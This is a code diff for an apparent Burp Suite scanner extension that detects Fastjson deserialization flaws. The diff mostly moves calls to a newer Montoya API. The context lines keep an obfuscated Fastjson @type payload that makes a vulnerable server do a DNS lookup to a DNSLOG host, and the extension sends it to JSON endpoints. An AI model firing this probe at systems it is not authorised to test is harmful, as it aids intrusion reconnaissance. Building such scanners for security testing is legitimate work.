@@ -1,7 +1,7 @@
 package jrcet.frame.Scanner.Fastjson;
 
+import burp.api.montoya.http.message.HttpHeader;
 import burp.api.montoya.http.message.HttpRequestResponse;
-import burp.api.montoya.http.message.headers.HttpHeader;
 import burp.api.montoya.http.message.requests.HttpRequest;
 import burp.api.montoya.http.message.responses.HttpResponse;
 import jrcet.frame.Setting.Setting;
@@ -28,24 +28,24 @@ public class Fastjson {
         String randomString = Helper.createRandomString(8);
         String body =  ("\\ufeff{,/*aab*/,'x_' : {/*aab*/\"@type\":\"java.net.InetSocketAddress\"{\"address\":/*aab*/,/*aa\"b*/ \"val\" :\""+randomString+"."+DNSLOG+"\"}}}");
 
-        HttpRequest httpRequest = httpRequestResponse.httpRequest();
+        HttpRequest httpRequest = httpRequestResponse.request();
 
         HttpRequest newHttpRequest=null;
 //        newHttpRequest.withBody(body);
         httpRequest = httpRequest.withBody(body);
-        if(Setting.DEBUG) API.logging().output().println(httpRequest.bodyAsString());
-        httpRequestResponse = API.http().issueRequest(httpRequest);
+        if(Setting.DEBUG) API.logging().output().println(httpRequest.bodyToString());
+        httpRequestResponse = API.http().sendRequest(httpRequest);
 
-        HttpResponse httpResponse = httpRequestResponse.httpResponse();
+        HttpResponse httpResponse = httpRequestResponse.response();
         if(Setting.DEBUG) API.logging().output().println(httpResponse.statusCode());
         UrlSet.add(CurrentURL);
     }
 
     private static boolean check(HttpRequestResponse httpRequestResponse){
-        CurrentURL = httpRequestResponse.httpRequest().withPath("/").url();
+        CurrentURL = httpRequestResponse.request().withPath("/").url();
         if(UrlSet.contains(CurrentURL)) return false;
 
-        List<HttpHeader> httpHeaders = httpRequestResponse.httpRequest().headers();
+        List<HttpHeader> httpHeaders = httpRequestResponse.request().headers();
         for(HttpHeader httpHeader: httpHeaders){
             if(Objects.equals(httpHeader.name().toLowerCase(), "content-type") && Objects.equals(httpHeader.value().toLowerCase(), "application/json")){
                 return true;
